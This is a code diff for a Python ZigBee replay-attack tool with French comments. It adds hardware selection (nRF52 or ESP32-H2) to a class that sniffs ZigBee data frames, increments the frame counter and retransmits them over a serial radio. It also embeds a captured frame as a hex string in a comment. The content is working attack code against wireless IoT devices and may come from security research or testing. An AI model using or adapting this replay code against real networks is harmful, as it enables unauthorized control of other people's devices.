@@ -76,7 +76,8 @@ class ZigbeeReplayAttack:
         channel: int = 13, 
         pan_id: int = 0x1900,
         serial_port: Optional[str] = None,
-        aes_key: Optional[str] = None
+        aes_key: Optional[str] = None,
+        materiel: str = 'nrf52'
     ):
         """
         Initialise l'attaque de replay ZigBee.
@@ -99,7 +100,8 @@ class ZigbeeReplayAttack:
         self.sniffer = SniffeurZigbee(
             canal=channel,
             fichier_sortie=capture_file,
-            vitesse_bauds=115200
+            vitesse_bauds=115200,
+            materiel=materiel
         )
         self.framefinder = ZigbeeFrameFinder()
         self.captures = []
@@ -128,6 +130,7 @@ class ZigbeeReplayAttack:
             if self.sniffer.captures:
                 for capture in self.sniffer.captures:
                     try:
+                        
                         # Filtrage de la trame selon le type, le cluster, le command_id et la taille
                         if (capture.get('type_trame') == 'Data' and
                             capture.get('couche_aps', {}).get('cluster_id', '').lower() == '0600' and
@@ -169,7 +172,7 @@ class ZigbeeReplayAttack:
         Remarque:
             La trame initiale est tronquée de ses 4 derniers octets avant d'être traitée.
         """
-        trame_initiale = self.attendre_trame_data()
+        trame_initiale = self.attendre_trame_data() #"6188f2eff4ffff00004818ffff00001e19a13260feffbd4d742f3c60feffbd4d74400a060004010152010202"#
         if not trame_initiale:
             return
         
@@ -180,7 +183,8 @@ class ZigbeeReplayAttack:
         try:
             with serial.Serial(self.serial_port, baudrate=115200, timeout=1) as ser:
                 logger.info(f"Début de l'envoi sur {self.serial_port}")
-                
+                if self.sniffer.materiel == 'esp32h2':
+                    ser.write(bytes("#CMD#MODE_TX",'utf-8'))
                 # Modification de la trame en incrémentant le compteur de trame
                 trame_modifiee = self.framefinder.increment_frame_counter(trame_initiale)
                 print("Trame modifiée : ", trame_modifiee)
